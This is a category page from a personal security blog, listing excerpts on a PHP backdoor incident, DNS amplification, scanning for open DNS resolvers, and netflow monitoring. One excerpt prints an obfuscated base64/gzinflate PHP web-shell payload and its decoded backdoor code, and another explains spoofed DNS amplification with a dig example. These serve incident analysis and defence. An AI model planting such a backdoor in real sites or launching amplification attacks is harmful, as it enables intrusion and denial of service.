<!DOCTYPE html>
<html lang="en-us">
<head>
  <title> Security &middot;  Greyhat.dk</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="https://www.greyhat.dk/css/bootstrap.min.css">
  <link rel="stylesheet" href="https://www.greyhat.dk/css/main.css" />
  <link rel="stylesheet" href="https://www.greyhat.dk/css/font-awesome.min.css" />
   <link rel="stylesheet" href="https://www.greyhat.dk/css/github.css" />
   <script src="https://www.greyhat.dk/js/jquery.min.js"></script>
  <script src="https://www.greyhat.dk/js/bootstrap.min.js"></script>
</head>
<body>

    <header class="global-header" style="background-image:url( /images/bg.jpg )">
    <section class="header-text">
    <h1><a href="https://www.greyhat.dk/">Greyhat.dk</a></h1>
    <div class="sns-links hidden-print">
  
  
  <a href="https://twitter.com/Desdic" target="_blank">
    <i class="fa fa-twitter"></i>
  </a>
  
  
  
  
  
  <a href="https://github.com/desdic" target="_blank">
    <i class="fa fa-github"></i>
  </a>
  
  
  
  <a href="https://linkedin.com/in/kimgertnielsen" target="_blank">
    <i class="fa fa-linkedin"></i>
  </a>
  
  
  <a href="https://keybase.io/desdic" target="_blank">
    <i class="fa fa-key"></i>
  </a>
  
</div>

    <a href="https://www.greyhat.dk/index.xml" class="btn-header btn-subscribe hidden-xs"><i class="fa fa-rss" aria-hidden="true"></i>&nbsp;Subscribe</a>
    </section>
</header>

<nav class="navbar navbar-inverse">
  <div class="container-fluid">
    <div class="navbar-header">
      <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#greyhatnavbar">
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
    </div>
    <div class="collapse navbar-collapse" id="greyhatnavbar">
        <ul class="nav navbar-nav">
            
            
            <li class=""><a href="../../">Home</a></li>
            
            <li class=""><a href="../../about">About</a></li>
            
            <li class=""><a href="../../links">Links</a></li>
            
      </ul>
    </div>
  </div>
</nav>



<div class="container">
<section class="article-list">
  <h1>Security</h1>
  
  <hr/>
  <article>
  <header>
    <h2><a href="https://www.greyhat.dk/php-callback-function-backdoor/">PHP callback function backdoor</a></h2>
    <div class="post-meta clearfix">
      <div class="post-date pull-left">
        Posted on
        <time datetime="2014-05-10T00:00:00Z">
          May 10, 2014
        </time>
      </div>
    </div>
  </header>
  <div>
    I recently had an incident at a customers website where the site was compromised. The customer went through the code and found several SQL injections, XSS and newly added files with backdoors (basic evals in PHP). All vulnerabilities was fixed (According to the customer) but about a month later the site was compromised again. Unfortunately no version control was used so we had to go through all files to help the customer and the log had no indications of successful attempts.
  </div>
  
  <footer>
    <ul class="pager">
      <li class="next"><a href="https://www.greyhat.dk/php-callback-function-backdoor/">Read more <span aria-hidden="true">&raquo;</span></a></li>
    </ul>
  </footer>
  
</article>

  
  <hr/>
  <article>
  <header>
    <h2><a href="https://www.greyhat.dk/dns-amplification-by-example/">DNS amplification by example</a></h2>
    <div class="post-meta clearfix">
      <div class="post-date pull-left">
        Posted on
        <time datetime="2013-04-22T00:00:00Z">
          Apr 22, 2013
        </time>
      </div>
    </div>
  </header>
  <div>
    How it works DNS amplification is very easy to make and quite effective. An attacker finds a DNS resolver that is public, creates a spoofed UDP DNS request originating from the targets address sending the DNS response to the target. The trick in this attack is to create a bigger output then input (hence the amplification). What better way than to request a list of authority records for a top level like .com # dig soa com @localhost ; &lt;&lt;&gt;&gt; DiG 9.7.3 &lt;&lt;&gt;&gt; soa com @localhost ;; global options: +cmd ;; Got answer: ;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 60774 ;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 13, ADDITIONAL: 0 ;; QUESTION SECTION: ;com.
  </div>
  
  <footer>
    <ul class="pager">
      <li class="next"><a href="https://www.greyhat.dk/dns-amplification-by-example/">Read more <span aria-hidden="true">&raquo;</span></a></li>
    </ul>
  </footer>
  
</article>

  
  <hr/>
  <article>
  <header>
    <h2><a href="https://www.greyhat.dk/scanning-for-recursive-dns-servers/">Scanning for recursive DNS servers</a></h2>
    <div class="post-meta clearfix">
      <div class="post-date pull-left">
        Posted on
        <time datetime="2013-04-11T00:00:00Z">
          Apr 11, 2013
        </time>
      </div>
    </div>
  </header>
  <div>
    When working for an ISP it becomes pretty clear that you don&rsquo;t want your customers or your network to participate in any attack. I wrote a small perl script to find DNS servers open for recursive requests scandns.pl I found 19 misconfigured DNS servers. Now the real work starts by contacting the owners.
  </div>
  
</article>

  
  <hr/>
  <article>
  <header>
    <h2><a href="https://www.greyhat.dk/lancope-stealthwatch/">Lancope stealthwatch</a></h2>
    <div class="post-meta clearfix">
      <div class="post-date pull-left">
        Posted on
        <time datetime="2013-02-28T00:00:00Z">
          Feb 28, 2013
        </time>
      </div>
    </div>
  </header>
  <div>
    Had a nice meeting yesterday with Cisco and some guys from Lanecope. Must say that stealthwatch seems like a really great product. What their product does is that is collects all flows (and more). Sums it up so you can drill down via connections. Basically it does something like this on your netflow data ~$ nfdump -R /var/cache/nfdump/data/asr0/nfcapd.201302281130:asr1/nfcapd.201302281133 -o long 'dst host 77.66.32.1'|head -10 Date flow start Duration Proto Src IP Addr:Port Dst IP Addr:Port Flags Tos Packets Bytes Flows 2013-02-28 11:29:58.616 0.000 TCP 198.89.107.36:41257 -&gt; 77.66.32.1:80 ....S.
  </div>
  
  <footer>
    <ul class="pager">
      <li class="next"><a href="https://www.greyhat.dk/lancope-stealthwatch/">Read more <span aria-hidden="true">&raquo;</span></a></li>
    </ul>
  </footer>
  
</article>

  
  <hr/>
  <article>
  <header>
    <h2><a href="https://www.greyhat.dk/php-backdoor/">PHP backdoor</a></h2>
    <div class="post-meta clearfix">
      <div class="post-date pull-left">
        Posted on
        <time datetime="2013-02-23T00:00:00Z">
          Feb 23, 2013
        </time>
      </div>
    </div>
  </header>
  <div>
    Found this little thing on FB tonight. &lt;?php eval(gzinflate(base64_decode(&quot;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&quot;))); ?&gt; After unrolling the endless loops it turns out to be &lt;? @error_reporting(0); @ini_set(&quot;display_errors&quot;,0); @ini_set(&quot;log_errors&quot;,0); @ini_set(&quot;error_log&quot;,0); if (isset($_GET['r'])) { print $_GET['r']; } elseif (isset($_POST['e'])) { print(base64_decode(str_rot13(strrev(base64_decode(str_rot13($_POST['e'])))))); } elseif (isset($_SERVER['HTTP_CONTENT_ENCODING']) &amp;&amp; $_SERVER['HTTP_CONTENT_ENCODING'] == 'binary') { $data = file_get_contents('php://input'); if (strlen($data) &gt; 0) print 'STATUS-IMPORT-OK'; if (strlen($data) &gt; 12) { $fp=@fopen('tmpfile','a'); @flock($fp, LOCK_EX); @fputs($fp, $_SERVER['REMOTE_ADDR'].&quot;\t&quot;.base64_encode($data).&quot;\r\n&quot;); @flock($fp, LOCK_UN); @fclose($fp); } } exit;?&gt; a backdoor
  </div>
  
</article>

  
</section>
  </main>
  <footer class="container global-footer">
    <div class="copyright-note pull-left">
      
    </div>
    <div class="sns-links hidden-print">
  
  
  <a href="https://twitter.com/Desdic" target="_blank">
    <i class="fa fa-twitter"></i>
  </a>
  
  
  
  
  
  <a href="https://github.com/desdic" target="_blank">
    <i class="fa fa-github"></i>
  </a>
  
  
  
  <a href="https://linkedin.com/in/kimgertnielsen" target="_blank">
    <i class="fa fa-linkedin"></i>
  </a>
  
  
  <a href="https://keybase.io/desdic" target="_blank">
    <i class="fa fa-key"></i>
  </a>
  
</div>

  </footer>

  <script src="https://www.greyhat.dk/js/highlight.pack.js"></script>
  <script>
    hljs.initHighlightingOnLoad();
  </script>
  
  
<script data-no-instant>document.write('<script src="http://'
        + (location.host || 'localhost').split(':')[0]
		+ ':/livereload.js?mindelay=10"></'
        + 'script>')</script></body>
</html>


